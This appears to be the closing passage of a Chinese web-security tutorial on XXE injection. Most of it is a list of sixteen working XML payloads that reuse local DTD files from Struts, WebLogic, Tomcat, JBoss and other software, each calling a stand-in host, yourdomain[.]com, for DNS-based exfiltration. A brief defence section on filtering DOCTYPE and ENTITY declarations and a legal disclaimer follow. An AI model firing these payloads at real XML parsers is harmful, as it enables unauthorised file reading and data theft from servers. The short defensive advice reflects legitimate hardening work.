<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/struts/struts-config_1_1.dtd"> <!ENTITY % AttributeName '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-11"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd"> <!ENTITY % AttributeName '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-12"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-4/language-specs/language.dtd"> <!ENTITY % itemattrs '> <!ENTITY % file "dns-exfil-13"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd"> <!ENTITY % n.InProceedings 'aaa)> <!ENTITY % file "dns-exfil-14"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/boostbook/dtd/boostbook.dtd"> <!ENTITY % boost.common.attrib '> <!ENTITY % file "dns-exfil-15"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd"> <!ENTITY % queries 'aaa)> <!ENTITY % file "dns-exfil-16"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "jar:///opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd"> <!ENTITY % publicIdentifier '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-17"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/nmap/nmap.dtd"> <!ENTITY % attr_numeric '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-18"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/liteide/liteeditor/kate/language.dtd"> <!ENTITY % commonAttributes '> <!ENTITY % file "dns-exfil-19"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgweather/locations.dtd"> <!ENTITY % name 'aaa)> <!ENTITY % file "dns-exfil-20"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-server-operation.dtd"> <!ENTITY % paramlist-dtd ' <!ENTITY % file "dns-exfil-21"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-paramlist.dtd"> <!ENTITY % array-dtd ' <!ENTITY % file "dns-exfil-22"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd"> <!ENTITY % measure '(aa) #IMPLIED> <!ENTITY % file "dns-exfil-23"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ATTLIST attxx aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/dblatex/schema/dblatex-config.dtd"> <!ENTITY % attlist.modname '> <!ENTITY % file "dns-exfil-24"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; <!ELEMENT aa "bb"'> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd"> <!ENTITY % block "xxx" > <!ENTITY % common ' <!ENTITY % file "dns-exfil-25"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
<?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd"> <!ENTITY % xs-datatypes ' <!ENTITY % file "dns-exfil-26"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.yourdomain[.]com/%file;'>"> %eval; %error; '> %local_dtd;]><message></message>
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuG4doVHRwYDBKkLmxUeKKqP9KMxg8qz1pxHr3ZAicyRrvks2BV7zKpHChkRwwSh2VibyeAcfgIiaQsA/640?wx_fmt=png)

  

  

第六阶段（xxe 防御）

过滤用户提交的 XML 数据，过滤关键词：<!DOCTYPE 和 <!ENTITY，或者 SYSTEM 和 PUBLIC，禁用外部实体引用。

 为了安全请将工具放在虚拟机运行！

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvbLttZqy2eKZMZXGLn7v3S8FAWbibd6jep8icjWUSiaA1LvMzQCbjt7htVrwfUOluLXib5CdGoK1nibDQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvbLttZqy2eKZMZXGLn7v3SV4pUcvlvyt68VIJ3AqC0U2aibcH0jQYkS5dpGIKNyPpjXNuTmgDIvibg/640?wx_fmt=jpeg)